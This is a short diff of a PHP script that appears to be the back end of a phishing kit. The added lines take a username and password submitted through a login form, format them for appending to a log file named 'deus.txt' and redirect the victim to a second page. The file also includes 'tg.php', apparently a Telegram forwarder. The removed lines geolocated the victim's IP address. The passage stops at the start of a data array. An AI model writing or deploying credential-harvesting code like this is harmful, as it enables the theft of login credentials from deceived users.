@@ -1,17 +1,14 @@
 <?php
 include('tg.php');
 
-$user=$_GET["user"];
-if($_POST){
-$ip=$_SERVER["REMOTE_ADDR"];
-$konum = file_get_contents("http://ip-api.com/xml/".$ip);
-$cek = new SimpleXMLElement($konum);
-$ulke = $cek->country;
-$sehir = $cek->city;
-date_default_timezone_set('Europe/Istanbul');  
-$cur_time=date("d-m-Y H:i:s");
+$user = $_POST["username"];
+$pass = $_POST["password"];
 
-$password=$_POST["password"];
+ $co = "===========================================\n"; 
+ $cl = "===========================================\n";
+ $fileuser = fopen("deus.txt", "a") or die("Intentalo nuevamente");
+ $us = "Username: $user\n";
+ $pa = "Password: $pass\n";
 header("location: password.php?id=$id");
 
 $data = [
